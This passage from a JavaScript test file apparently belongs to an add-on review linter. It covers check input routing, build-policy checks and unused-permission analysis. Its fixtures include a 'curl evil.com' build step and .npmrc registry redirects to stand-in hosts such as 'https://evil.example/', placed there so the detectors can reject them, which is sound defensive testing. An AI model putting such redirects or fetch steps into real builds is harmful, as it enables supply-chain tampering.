// target, xpi = the built XPI). A check reads only ctx.addon and the orchestrator
// hands it the correct one; no ctx field or helper exposes the other artifact, so
// the guarantee is structural (not a source scan). These tests pin the dangerous
// set and prove the routing reaches the escalation too.

// Every check declares a valid input, and the (rare, dangerous) input:xpi set is
// pinned to exactly the structure checks. A new or flipped check trips this test
// rather than silently reading the wrong artifact.
test("every check declares a valid input; the input:xpi set is exactly the pinned structure checks", async () => {
  const byPhase = await loadChecks(loadRegistry());
  const checks = allChecks(byPhase);
  for (const c of checks) {
    assert.ok(
      c.input === "source" ||
        c.input === "xpi" ||
        c.input === "build" ||
        c.input === "manifest",
      `check "${c.id}" has an invalid input ${JSON.stringify(c.input)}`
    );
  }
  // input: manifest reads the shipped manifest ONLY, on a ctx with no file corpus
  // (buildXpiCtxs' manifestCtx). The pure-manifest checks; extending this set is deliberate too.
  const manifest = checks
    .filter((c) => c.input === "manifest")
    .map((c) => c.id)
    .sort();
  assert.deepEqual(manifest, [
    "addon-icon-missing",
    "csp-unsafe-eval",
    "csp-unsafe-inline",
    "experiment-manual-review",
    "experiment-missing-strict-max-version",
    "experiment-overrides-api",
    "manifest-invalid-json",
    "manifest-missing",
    "manifest-missing-key",
    "manifest-unknown-permission",
    "manifest-version-mismatch",
    "minimize-host-permissions",
    "mistyped-manifest-value",
    "native-messaging",
    "non-experiment-strict-max-version",
    "update-url",
  ]);
  const xpi = checks
    .filter((c) => c.input === "xpi")
    .map((c) => c.id)
    .sort();
  // The ONLY checks that read the built XPI instead of the review target: the file /
  // _locales / reachability-structure checks, plus unused-permission (it judges whether a
  // declared permission is exercised in the SHIPPED bytes). Extending this set is deliberate -
  // update the check AND this pin together.
  assert.deepEqual(xpi, [
    "background-module",
    "background-page-module",
    "bundled-files",
    "default-locale-missing",
    "default-locale-unused",
    "minimize-web-accessible-resources",
    "missing-english-localization",
    "trademark-violation",
    "unrecognized-file-type",
    "unrecognized-manifest-key",
    "unused-files",
    "unused-permission",
  ]);
  // input: build reads the SCA build files (archive minus source minus node_modules).
  // The three build-review checks (gated on the setup classification) plus the
  // deterministic build-policy checks; extending this set is deliberate too.
  const build = checks
    .filter((c) => c.input === "build")
    .map((c) => c.id)
    .sort();
  assert.deepEqual(build, [
    "build-lifecycle-hook",
    "build-registry-redirect",
    "committed-build-artifact",
    "committed-node-modules",
    "undeclared-build-source",
    "unsupported-build-tool",
  ]);
});

// The routing reaches the escalation too - the seam that finding B slipped
// through. An `input: xpi` check raises its cases over the XPI, and runOneCheck
// -> the check must read the XPI's files (via the routed ctx.addon), not
// a captured review source. unused-files emits a candidate for an ambiguous file (a
// live dynamic loader names it), so this exercises the real corpus path with a stub
// ctx that records the addon it was given.
test("an input:xpi check escalates over its routed (XPI) addon", async () => {
  const mk = (obj) =>
    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
  const manifest = { manifest_version: 3, background: { scripts: ["bg.js"] } };
  // bg.js is live and dynamically imports a runtime-built path that names helper.js,
  // so helper.js is ambiguous and unused-files escalates it.
  const xpi = {
    files: mk({
      "manifest.json": JSON.stringify(manifest),
      "bg.js": `const p = "./helper.js";\nimport(p);`,
      "helper.js": `console.log(1);`,
    }),
    manifest,
  };
  const [check] = allChecks(
    await loadChecks(loadRegistry(), { only: ["unused-files"] })
  );
  // The orchestrator routes an `input: xpi` check to a ctx whose addon is the XPI,
  // so the case it raises names a file from THAT addon.
  const ctx = {
    addon: xpi,
    jsSources: parsedSources(xpi, { schema }),
    schema,
    mode: REVIEW_MODE.SCA,
    options: {},
  };
  const out = await runOneCheck(withManifest(ctx), check, "[1/1]");
  assert.deepEqual(
    out.manualItems.map((m) => m.file),
    ["helper.js"]
  );
});

// ---- build review: undeclared-build-source (SCA; reads the setup record on
// ctx.addon.buildReview, produced by analyzeBuild) ----

const buildCtx = (review) => ({
  addon: { files: new Map(), buildReview: review },
});
const review = (over) => ({
  classification: null,
  reason: "",
  buildInstructions: "",
  unresolved: [],
  analyzed: false,
  anchor: "package.json",
  ...over,
});

// EVERY source-code submission raises this: the reviewer's attestation that the shipped
// XPI comes from the source they read is what the SCA review rests on, so a submission
// documenting no build at all is still checked against the XPI. The entry carries how
// the source says to build it and whatever steps the linter could not follow.
test("undeclared-build-source escalates every SCA, build documented or not", () => {
  const out = undeclaredBuildSource.run(
    buildCtx(review({ buildInstructions: "npm ci && npm run build" }))
  );
  assert.equal(out.findings.length, 0);
  assert.equal(out.escalations.length, 1);
  assert.equal(out.escalations[0].file, "package.json");
  // WHERE it is listed is the entry's `escalation: manual-review`, not the case's - the
  // reviewer must reproduce the build themselves, which reading the code cannot replace.
  assert.equal(out.escalations[0].manualReview, undefined);
  assert.equal(
    out.escalations[0].data.buildInstructions,
    "npm ci && npm run build"
  );

  // A step the linter could not statically bound is named in the entry.
  const unresolved = undeclaredBuildSource.run(
    buildCtx(
      review({ unresolved: [{ kind: "network", detail: "curl evil.com" }] })
    )
  );
  assert.match(
    unresolved.escalations[0].data.unresolvedBuildSteps,
    /curl evil\.com/
  );

  // No build entry point at all still escalates - but with NO locus, rather than
  // pointing the reviewer at a package.json the submission does not have.
  const none = undeclaredBuildSource.run(
    buildCtx(review({ classification: "none", anchor: null }))
  );
  assert.equal(none.findings.length, 0);
  assert.equal(none.escalations.length, 1);
  assert.equal("file" in none.escalations[0], false);
});

// ---- unsupported-build-tool (SCA deterministic: npm/pnpm only) ----

// A committed yarn/bun fingerprint - a lockfile or the package.json "packageManager"
// field - is a hard reject: the offending tool is the finding's item, anchored at the
// fingerprint file. npm/pnpm (or no evidence) is clean.
test("unsupported-build-tool rejects yarn/bun by lockfile or packageManager field", () => {
  const run = (obj) =>
    unsupportedBuildTool.run({
      addon: {
        files: new Map(
          Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])
        ),
      },
    }).findings;
  const one = (out, tool, file) => {
    assert.equal(out.length, 1);
    assert.equal(out[0].item, tool);
    assert.equal(out[0].file, file);
  };
  one(run({ "yarn.lock": "" }), "yarn", "yarn.lock");
  one(run({ "bun.lockb": "" }), "bun", "bun.lockb");
  one(run({ "bunfig.toml": "" }), "bun", "bunfig.toml");
  one(
    run({ "package.json": '{"packageManager":"yarn@4.1.0"}' }),
    "yarn",
    "package.json"
  );
  // npm/pnpm and no-evidence are clean.
  assert.deepEqual(
    run({
      "package.json": '{"packageManager":"pnpm@9"}',
      "pnpm-lock.yaml": "",
    }),
    []
  );
  assert.deepEqual(
    run({ "package.json": "{}", "package-lock.json": "{}" }),
    []
  );
  assert.deepEqual(
    unsupportedBuildTool.run({ addon: { files: new Map() } }).findings,
    []
  );
});

// ---- build-registry-redirect (SCA deterministic: .npmrc registry) ----

// ANY registry= / @scope:registry= in .npmrc is a hard reject (a legit build never sets
// the registry) - the raw value is the item, anchored at the line; the value is not
// parsed. Auth lines, comments, unrelated keys, and no .npmrc are clean.
test("build-registry-redirect rejects any registry setting in .npmrc", () => {
  const run = (npmrc) =>
    buildRegistryRedirect.run({
      addon: { files: new Map([[".npmrc", Buffer.from(npmrc)]]) },
    }).findings;
  const one = (out, item) => {
    assert.equal(out.length, 1);
    assert.equal(out[0].item, item);
    assert.equal(out[0].file, ".npmrc");
    assert.equal(out[0].loc.line, 1);
  };
  one(run("registry=https://evil.example/"), "https://evil.example/");
  one(
    run("@acme:registry=https://npm.pkg.github.com"),
    "https://npm.pkg.github.com"
  );
  one(run("registry=${NPM_REG}"), "${NPM_REG}");
  // npm's `[]` array-append syntax sets the same registry config -> also rejected;
  // `registry[0]=` is NOT honored by npm, so it stays clean.
  one(run("registry[]=https://evil/"), "https://evil/");
  one(run("@acme:registry[]=https://x/"), "https://x/");
  assert.deepEqual(run("registry[0]=https://evil/"), []);
  // Even the public registry, a quoted value, and an uppercase key are rejected - the
  // value is never parsed, so nothing slips past on host/quote/case.
  assert.equal(run("registry=https://registry.npmjs.org/").length, 1);
  assert.equal(run('registry="https://registry.npmjs.org/"').length, 1);
  assert.equal(run("REGISTRY=https://evil/").length, 1);
  // Auth lines, comments, unrelated keys, and no .npmrc are clean.
  assert.deepEqual(run("//registry.npmjs.org/:_authToken=abc"), []);
  assert.deepEqual(run("# registry=https://evil/"), []);
  assert.deepEqual(run("save-exact=true"), []);
  assert.deepEqual(
    buildRegistryRedirect.run({ addon: { files: new Map() } }).findings,
    []
  );
});

// A disallowed fingerprint is matched at ANY depth (a build run from a subfolder), by
// basename - not just at the root.
test("unsupported-build-tool detects nested lockfiles + packageManager", () => {
  const run = (obj) =>
    unsupportedBuildTool.run({
      addon: {
        files: new Map(
          Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])
        ),
      },
    }).findings;
  const nested = run({
    "frontend/yarn.lock": "",
    "frontend/package.json": "{}",
  });
  assert.equal(nested.length, 1);
  assert.equal(nested[0].item, "yarn");
  assert.equal(nested[0].file, "frontend/yarn.lock");
  const pm = run({ "app/package.json": '{"packageManager":"bun@1"}' });
  assert.equal(pm[0].item, "bun");
  assert.equal(pm[0].file, "app/package.json");
  // A nested npm build is clean.
  assert.deepEqual(
    run({ "frontend/package.json": "{}", "frontend/package-lock.json": "{}" }),
    []
  );
});

// Nested .npmrc (a build that runs from a subfolder) is scanned too; the reject is on
// the mere presence of the registry key, not its value.
test("build-registry-redirect scans nested .npmrc and rejects any registry key", () => {
  const at = (path, npmrc) =>
    buildRegistryRedirect.run({
      addon: { files: new Map([[path, Buffer.from(npmrc)]]) },
    }).findings;
  const nested = at("frontend/.npmrc", "registry=https://evil.example/");
  assert.equal(nested.length, 1);
  assert.equal(nested[0].file, "frontend/.npmrc");
  assert.equal(nested[0].item, "https://evil.example/");
  // The public registry, a scoped registry, and an uppercase key are all rejected.
  assert.equal(at(".npmrc", "registry=https://registry.npmjs.org/").length, 1);
  assert.equal(at(".npmrc", "@a:registry=https://x/").length, 1);
  assert.equal(at(".npmrc", "REGISTRY=https://evil/").length, 1);
});

// ---- committed-node-modules (SCA deterministic: no committed node_modules) ----

// Each node_modules directory the loader recorded (never read) becomes an error finding
// anchored at that directory; none recorded -> no finding.
test("committed-node-modules flags each recorded node_modules directory", () => {
  const run = (nodeModules) =>
    committedNodeModules.run({ addon: { nodeModules } }).findings;
  const out = run(["node_modules", "packages/a/node_modules"]);
  assert.equal(out.length, 2);
  // The directory travels as the locus only. It carries no item, so the response
  // names no folder and the findings collapse into one entry per submission.
  assert.deepEqual(
    out.map((f) => f.file),
    ["node_modules", "packages/a/node_modules"]
  );
  assert.deepEqual(
    out.map((f) => f.item),
    [null, null]
  );
  // None recorded, or no addon -> no finding.
  assert.deepEqual(run([]), []);
  assert.deepEqual(committedNodeModules.run({}).findings, []);
});

// ---- manual-checks ----
// Every entry is emitted for every review: the list is the always-by-hand work, with
// no gate of its own. What a CHECK escalates is surfaced by the orchestrator instead.
test("manualChecks emits every entry, ungated", () => {
  const reg = loadRegistry();
  const titles = reg.manualChecks().map((m) => m.title);
  assert.ok(titles.includes("Forked add-on"));
  assert.ok(titles.includes("Check the package for unacceptable content"));
  assert.equal(titles.length, reg.manualCheckIds().length);
});

// Every manual-checks entry carries a `check:` id (id metadata, not a runnable
// check): the ids are present on all entries, unique, do not collide with the
// rule-backed checkIds(), and each has a matching docs/checks/<id>.html page - so
// the docs reference real registry ids, not invented ones.
test("manual checks have unique, doc-backed check ids distinct from rule ids", () => {
  const reg = loadRegistry();
  const manualIds = reg.manualCheckIds();
  const manualTitles = reg.manualChecks();
  // One id per manual-checks entry.
  assert.equal(manualIds.length, 10);
  assert.equal(new Set(manualIds).size, manualIds.length, "ids are unique");
  // Manual ids are NOT in the runnable check namespace (no rule module).
  const runnable = new Set(reg.checkIds());
  for (const id of manualIds) {
    assert.ok(!runnable.has(id), `manual id ${id} collides with a rule id`);
  }
  // Each manual id has a documentation page (registry <-> docs stay in sync).
  const docDir = path.join(here, "..", "..", "docs", "checks");
  for (const id of manualIds) {
    assert.ok(
      fs.existsSync(path.join(docDir, `${id}.html`)),
      `missing docs/checks/${id}.html`
    );
  }
  // Sanity: the diff:false fork check is one of them.
  assert.ok(manualIds.includes("forked-add-on"));
  assert.ok(manualTitles.length > 0);
});

// ---- unused-permission (producer of permissions to vet) ----
// It always enumerates the declared NAMED permissions a reachable API call does
// not provably require, one escalation each (anchored to the manifest line); host
// match patterns are skipped. Same-bodied cases auto-group into the one by-hand
// reminder.
test("unused-permission lists the unprovable declared named permissions", () => {
  const manifest = {
    permissions: ["tabs", "https://example.com/*"],
    optional_permissions: ["storage"],
    // >= 154 so the post-D308076 producer (this module) enumerates.
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    // No API usages -> nothing is provably used -> every named permission is
    // still escalated for the reviewer (the host match pattern is skipped).
    apiUsages: [],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx));
  assert.equal(out.findings.length, 0);
  assert.deepEqual(out.escalations.map((e) => e.item).sort(), [
    "storage",
    "tabs",
  ]);
  assert.ok(out.escalations.every((e) => e.file === "manifest.json"));
});

// The deterministic verdict: a permission whose linked prompt entries
// (check.permissionTokens) declare usage tokens that appear nowhere in the LIVE
// code (comments excluded) or manifest is unused - a finding, never an
// escalation. Everything the tokens cannot decide keeps escalating: a found
// token, an entry without tokens (unlimitedStorage), or no entry at all.
// Shaped exactly like production LoadedCheck.permissionTokens
// (permissionTokensFor): token entries only, no prose.
const PERMISSION_TOKENS = [
  {
    permissions: ["compose"],
    tokens: [
      "tabs.executeScript",
      "tabs.insertCSS",
      "scripting.executeScript",
      "scripting.insertCSS",
    ],
    minStrictVersion: null,
    maxStrictVersion: null,
  },
  {
    permissions: ["cookies"],
    tokens: ["cookieStoreId"],
    minStrictVersion: null,
    maxStrictVersion: null,
  },
  {
    permissions: ["unlimitedStorage"],
    tokens: [],
    minStrictVersion: null,
    maxStrictVersion: null,
  },
];

test("unused-permission decides token-absent permissions deterministically", () => {
  const manifest = {
    manifest_version: 2,
    permissions: ["compose", "cookies", "storage", "unlimitedStorage"],
    background: { scripts: ["bg.js"] },
  };
  // "compose" uses dotted (api-resolved) injection tokens, and there is no resolved
  // tabs.*/scripting.* injection call here (the comment names tabs.executeScript, but a
  // comment is never a call, and apiUsages is empty), so compose is deterministically
  // unused. The bare "cookieStoreId" token in live code grounds "cookies" via the atom
  // scan. Extraction populates codeAtoms (the comment-free atoms) on the authored source.
  const code = [
    "// tabs.executeScript(1, { file: 'x.js' }) would need a permission",
    "browser.tabs.create({ url: 'a.html', cookieStoreId: store });",
  ].join("\n");
  const jsSources = [{ file: "bg.js", code, lineOffset: 0 }];
  runExtractionPass(jsSources, { schema });
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from(code)],
      ]),
    },
    jsSources,
    apiUsages: [],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    permissionTokens: PERMISSION_TOKENS,
  });
  assert.deepEqual(
    out.findings.map((f) => f.item),
    ["compose"]
  );
  assert.deepEqual(out.escalations.map((e) => e.item).sort(), [
    "cookies",
    "storage",
    "unlimitedStorage",
  ]);
  // cookies escalated because its token is PRESENT in live code but not API-grounded:
  // the located site rides along so a reviewer can judge it per occurrence.
  assert.deepEqual(
    out.escalations.find((e) => e.item === "cookies").occurrences,
    [{ id: "cookies#1", file: "bg.js", line: 2, token: "cookieStoreId" }]
  );
  // A token-less permission (unlimitedStorage) escalates holistically - no sites. A
  // permission with no prompt entry (storage) likewise has no tokens, so no sites.
  assert.deepEqual(
    out.escalations.find((e) => e.item === "unlimitedStorage").occurrences,
    []
  );
  assert.deepEqual(
    out.escalations.find((e) => e.item === "storage").occurrences,
    []
  );
});

// The NON-AUTHORED bundle path for a BARE token: a vendored bundle has no codeAtoms, so
// its raw text is scanned line by line (with its lineOffset applied).
test("unused-permission locates a bare token in a non-authored bundle (raw scan)", () => {
  const manifest = { manifest_version: 2, permissions: ["cookies"] };
  const bundle = "// vendored\nvar a = opts.cookieStoreId;";
  const jsSources = [{ file: "lib.js", code: bundle, lineOffset: 5 }];
  runExtractionPass(jsSources, { schema, nonAuthored: new Set(["lib.js"]) });
  const ctx = {
    schema,
    jsSources,
    apiUsages: [],
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["lib.js", Buffer.from(bundle)],
      ]),
    },
  };
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    permissionTokens: PERMISSION_TOKENS,
  });
  // cookieStoreId located in the non-authored bundle via the raw-line scan, lineOffset
  // applied (source line 2 + offset 5).
  assert.deepEqual(
    out.escalations.find((e) => e.item === "cookies").occurrences,
    [{ id: "cookies#1", file: "lib.js", line: 7, token: "cookieStoreId" }]
  );
});

// DOTTED (namespace-qualified) injection tokens are resolved against the api-usage
// analysis, not the text scan: only a real tabs.*/scripting.* CALL counts. This is both
// the noise reduction (a bare identifier, a property read on a local, and a comment do
// NOT match) and the tabs-vs-scripting precision. It also covers the split dispatch
// (compose's dotted tokens via api-usage AND cookies' bare token via the atom scan in one
// run) and the per-line dedup (two injection calls on one line collapse to one site).
test("unused-permission resolves dotted injection tokens via api-usage; bare tokens via atoms", () => {
  const manifest = {
    manifest_version: 3,
    permissions: ["compose", "messagesModify", "activeTab", "cookies"],
    background: { scripts: ["bg.js"] },
  };
  const code = [
    "// browser.tabs.executeScript(x) in a comment must NOT count", // line 1
    "browser.tabs.executeScript(t, { code: 'a' });", // line 2 -> tabs.executeScript
    "messenger.scripting.insertCSS(t, { css: 'b' });", // line 3 -> scripting.insertCSS
    "const bare = executeScript;", // line 4 -> bare identifier, NOT a call
    "function f(tab) { return tab.executeScript; }", // line 5 -> property on a local, NOT a call
    "browser.tabs.executeScript(a); browser.scripting.executeScript(b);", // line 6 -> two calls, one line
    "const c = obj.cookieStoreId;", // line 7 -> bare token (cookies), atom scan
  ].join("\n");
  const jsSources = [{ file: "bg.js", code, lineOffset: 0 }];
  runExtractionPass(jsSources, { schema });
  const ctx = withManifest({
    schema,
    jsSources,
    apiUsages: [{ file: "bg.js", ...apiUsageOf(jsSources[0]) }],
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from(code)],
      ]),
    },
  });
  const permissionTokens = [
    ...["compose", "messagesModify", "activeTab"].map((p) => ({
      permissions: [p],
      tokens: [
        "tabs.executeScript",
        "tabs.insertCSS",
        "scripting.executeScript",
        "scripting.insertCSS",
      ],
      minStrictVersion: null,
      maxStrictVersion: null,
    })),
    {
      permissions: ["cookies"],
      tokens: ["cookieStoreId"],
      minStrictVersion: null,
      maxStrictVersion: null,
    },
  ];
  const out = unusedPermissionProducer.run(ctx, { permissionTokens });
  const linesOf = (perm) =>
    out.escalations
      .find((e) => e.item === perm)
      .occurrences.map((o) => o.line)
      .sort((a, b) => a - b);
  // Only the resolved injection CALLS (lines 2, 3, and 6 - deduped to one) count; the
  // comment (1), bare identifier (4), and local property read (5) contribute nothing.
  for (const p of ["compose", "messagesModify", "activeTab"]) {
    assert.deepEqual(linesOf(p), [2, 3, 6], p);
    // every injection occurrence carries a dotted (namespace-qualified) token.
    assert.ok(
      out.escalations
        .find((e) => e.item === p)
        .occurrences.every((o) => o.token.includes(".")),
      `${p} occurrences are dotted`
    );
  }
  // Bare token still resolved via the atom scan, in the SAME run (split dispatch).
  assert.deepEqual(
    out.escalations.find((e) => e.item === "cookies").occurrences,
    [{ id: "cookies#1", file: "bg.js", line: 7, token: "cookieStoreId" }]
  );
});

// The compose_scripts manifest key requires compose (the required_permissions
// annotation the local extensionScripts.json overlay adds to the key). Declaring
// the key grounds compose as USED, so it is dropped outright - neither a
// deterministic-unused finding nor a manual escalation. This is the schema-driven
// grounding, not the token pre-flight.
test("unused-permission grounds compose from the compose_scripts manifest key", () => {
  const manifest = {
    manifest_version: 2,
    permissions: ["compose"],
    compose_scripts: [{ js: ["c.js"] }],
  };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    permissionTokens: PERMISSION_TOKENS,
  });
  assert.equal(out.findings.length, 0);
  assert.deepEqual(out.escalations, []);
});

// message_display_scripts requires messagesModify always, plus scripting before
// Thunderbird 154 (a version-bounded required_permissions entry). The grounding
// version-filters by the add-on's strict_min_version, so the scripting requirement
// only applies below 154.
test("message_display_scripts version-filters scripting on the 154 boundary", () => {
  const run = (strict_min_version) => {
    const manifest = {
      manifest_version: 3,
      permissions: [],
      message_display_scripts: [{ js: ["c.js"] }],
      browser_specific_settings: { gecko: { strict_min_version } },
    };
    const ctx = withManifest({
      schema,
      addon: {
        manifest,
        files: new Map([
          ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ]),
      },
      apiUsages: [],
    });
    return missingPermission.run(ctx).findings.map((f) => f.item);
  };
  // Before 154: both messagesModify AND scripting are required (undeclared -> missing).
  const pre = run("128.0");
  assert.ok(pre.includes("messagesModify"));
  assert.ok(pre.includes("scripting"));
  // 154+: only messagesModify is required; scripting is out of bounds.
  const post = run("154.0");
  assert.ok(post.includes("messagesModify"));
  assert.ok(!post.includes("scripting"));
});

// The deterministic path disables itself whenever the scan cannot see every usage:
// unresolved API surface (apiUsage limitations / dynamic member tails could spell a gated
// call without its token) or OBFUSCATED first-party code (API names built at runtime /
// mangled reads hide a call). Those escalate. SCA mode alone does not blind the scan -
// the check judges the SHIPPED XPI, so a clean scan is decidable in SCA as well.
test("unused-permission escalates instead of deciding when the scan is blind", () => {
  const manifest = {
    manifest_version: 2,
    permissions: ["compose"],
  };
  const base = () => ({
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  });
  // Decidable baseline: tokens absent -> finding.
  const decided = unusedPermissionProducer.run(withManifest(base()), {
    permissionTokens: PERMISSION_TOKENS,
  });
  assert.equal(decided.findings.length, 1);
  // A dynamic member tail (browser.tabs[m]) -> blind -> escalate.
  const dynamic = base();
  dynamic.apiUsages = [
    {
      file: "bg.js",
      usages: [{ segments: ["tabs"], dynamicTail: true, line: 1, column: 0 }],
      limitations: [],
    },
  ];
  const dyn = unusedPermissionProducer.run(withManifest(dynamic), {
    permissionTokens: PERMISSION_TOKENS,
  });
  assert.equal(dyn.findings.length, 0);
  assert.deepEqual(
    dyn.escalations.map((e) => e.item),
    ["compose"]
  );
  // An unresolved-alias limitation -> blind -> escalate.
  const limited = base();
  limited.apiUsages = [
    {
      file: "bg.js",
      usages: [],
      limitations: [{ line: 1, column: 0, reason: "aliased/destructured" }],
    },
  ];
  assert.equal(
    unusedPermissionProducer.run(withManifest(limited), {
      permissionTokens: PERMISSION_TOKENS,
    }).findings.length,
    0
  );
  // OBFUSCATED first-party code -> the shipped scan can't be trusted -> escalate. (Pre-seed the
  // classification so classifyAddonJs sees an obfuscated tag without needing a real bundle.)
  const obfuscated = base();
  obfuscated.addon.bundled = {
    classified: [
      {
        file: "bg.js",
        obfuscation: VERDICT.FAIL,
        library: false,
        untrusted: false,
      },
    ],
    nonAuthored: new Set(["bg.js"]),
  };
  const obf = unusedPermissionProducer.run(withManifest(obfuscated), {
    permissionTokens: PERMISSION_TOKENS,
  });
  assert.equal(obf.findings.length, 0); // no deterministic finding
  assert.deepEqual(
    obf.escalations.map((e) => e.item),
    ["compose"] // it ESCALATED (not merely absent)
  );
  // SCA mode alone does not blind the scan: it judges the SHIPPED XPI, so a clean scan is
  // decidable in SCA as well - a genuinely-unused permission is a deterministic finding.
  const sca = base();
  sca.mode = REVIEW_MODE.SCA;
  assert.equal(
    unusedPermissionProducer.run(withManifest(sca), {
      permissionTokens: PERMISSION_TOKENS,
    }).findings.length,
    1
  );
});

// A matched entry WITHOUT tokens declares its usages token-undetectable, so it
// poisons its permissions to undecidable even when another matched entry
// contributes tokens for the same permission. A version-EXCLUDED token-less
// entry does not apply and must NOT poison.
test("unused-permission: a version-excluded token-less entry does not poison", () => {
  const manifest = {
    manifest_version: 2,
    permissions: ["compose"],
    browser_specific_settings: { gecko: { strict_min_version: "128.0" } },
  };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
  const permissionTokens = [
    ...PERMISSION_TOKENS,
    // Applies only from 154 on - out of bounds for this add-on, so its
    // token-lessness is irrelevant and compose stays decidable.
    {
      permissions: ["compose"],
      tokens: [],
      minStrictVersion: "154",
      maxStrictVersion: null,
    },
  ];
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    permissionTokens,
  });
  assert.deepEqual(
    out.findings.map((f) => f.item),
    ["compose"]
  );
});

test("unused-permission: a token-less entry poisons its permissions", () => {
  const manifest = { manifest_version: 2, permissions: ["compose"] };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
  const permissionTokens = [
    ...PERMISSION_TOKENS,
    {
      permissions: ["compose"],
      tokens: [],
      minStrictVersion: null,
      maxStrictVersion: null,
    },
  ];
  const out = unusedPermissionProducer.run(withManifest(ctx), {
    permissionTokens,
  });
  assert.equal(out.findings.length, 0);
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["compose"]
  );
});

// The token lists are version-bound like the prompts they ride on: an entry
// whose bounds exclude the add-on's strict_min_version contributes no tokens,
// so the permission stays undecidable and escalates.
test("unused-permission selects token lists by strict_min_version", () => {
  const permissionTokens = [
    {
      permissions: ["compose"],
      tokens: ["executeScript"],
      minStrictVersion: "154",
      maxStrictVersion: null,
    },
  ];
  const run = (strictMin) => {
    const manifest = {
      manifest_version: 2,
      permissions: ["compose"],
      browser_specific_settings: { gecko: { strict_min_version: strictMin } },
    };
    const ctx = {
      schema,
      addon: {
        manifest,
        files: new Map([
          ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ]),
      },
      apiUsages: [],
    };
    return unusedPermissionProducer.run(withManifest(ctx), {
      permissionTokens,
    });
  };
  // In bounds: the tokens apply, executeScript is absent -> deterministic.
  assert.deepEqual(
    run("154.0").findings.map((f) => f.item),
    ["compose"]
  );
  // Out of bounds: no matching entry -> undecidable -> escalates.
  assert.deepEqual(
    run("128.0").escalations.map((e) => e.item),
    ["compose"]
  );
});

// The deterministic analysis is authoritative: a permission a reachable API call
// provably requires (here messagesRead, via messages.get) is dropped here, so it
// never reaches the reviewer at all. Only the unprovable rest
// (messagesUpdate) is escalated.
test("unused-permission drops permissions proved used by static analysis", () => {
  const manifest = {
    manifest_version: 3,
    permissions: ["messagesRead", "messagesUpdate"],
    background: { scripts: ["bg.js"] },
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const notes = [];
  const ctx = {
    schema,
    note: (file, loc, item, verdict) => notes.push({ item, verdict }),
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from("")],
      ]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [{ segments: ["messages", "get"], line: 1, column: 0 }],
      },
    ],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx));
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["messagesUpdate"] // messagesRead is gated out (provably used)
  );
  // The override is recorded as a pass note, so the feed shows it was dropped.
  assert.deepEqual(
    notes.find((n) => n.item === "messagesRead"),
    { item: "messagesRead", verdict: VERDICT.PASS }
  );
});

// FUNCTION-level permissions are credited too, not just namespace-level ones: a
// messages.archive call proves messagesMove and messages.delete proves messagesDelete,
// so neither is flagged unused. This is the credit path the shim/wrapper fix relies on
// (the parser resolving a captured-namespace call to these segments is covered in
// api-usage.test.js; here it is driven from the already-resolved segments).
test("unused-permission credits function-level permissions (archive/delete)", () => {
  const manifest = {
    manifest_version: 3,
    permissions: ["messagesRead", "messagesMove", "messagesDelete"],
    background: { scripts: ["bg.js"] },
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const ctx = withManifest({
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from("")],
      ]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          { segments: ["messages", "archive"], line: 1, column: 0 },
          { segments: ["messages", "delete"], line: 2, column: 0 },
        ],
      },
    ],
  });
  const out = unusedPermissionProducer.run(ctx);
  // archive -> messagesMove, delete -> messagesDelete, both -> messagesRead: none left.
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    []
  );
  const analysis = getPermissionAnalysis(ctx);
  assert.ok(analysis.usedPermissions.has("messagesMove"));
  assert.ok(analysis.usedPermissions.has("messagesDelete"));
});

// A permission that gates no callable API (unlimitedStorage) can never be proved
// used by static analysis. It is no longer hand-exempt: it escalates like any other
// not-provably-used permission, escalated for a reviewer to settle (the registry
// grounds it on whether the add-on persists data) or reviewed by hand.
test("unused-permission escalates unlimitedStorage (gates no API)", () => {
  const manifest = {
    permissions: ["unlimitedStorage", "tabs"],
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const notes = [];
  const ctx = {
    schema,
    note: (file, loc, item, verdict) => notes.push({ item, verdict }),
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
